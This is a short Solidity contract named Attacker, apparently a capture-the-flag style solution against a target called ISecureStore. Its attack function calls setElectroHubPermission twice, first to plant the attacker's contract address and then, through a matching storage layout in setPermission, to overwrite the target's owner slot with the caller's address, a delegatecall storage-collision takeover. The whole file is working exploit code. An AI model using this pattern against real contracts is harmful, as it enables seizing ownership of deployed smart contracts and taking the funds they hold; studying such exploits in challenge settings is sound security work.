// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;
import "hardhat/console.sol";

interface ISecureStore {
    function owner() external view returns (address);
    function setElectroHubPermission(uint256) external;
}
contract Attacker {
    address public electroHub;
    address public agroCenter;
    address public owner;

    function attack(ISecureStore target) external {
        target.setElectroHubPermission(uint256(uint160(address(this))));
        target.setElectroHubPermission(uint256(uint160(msg.sender)));
    }

    function setPermission(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}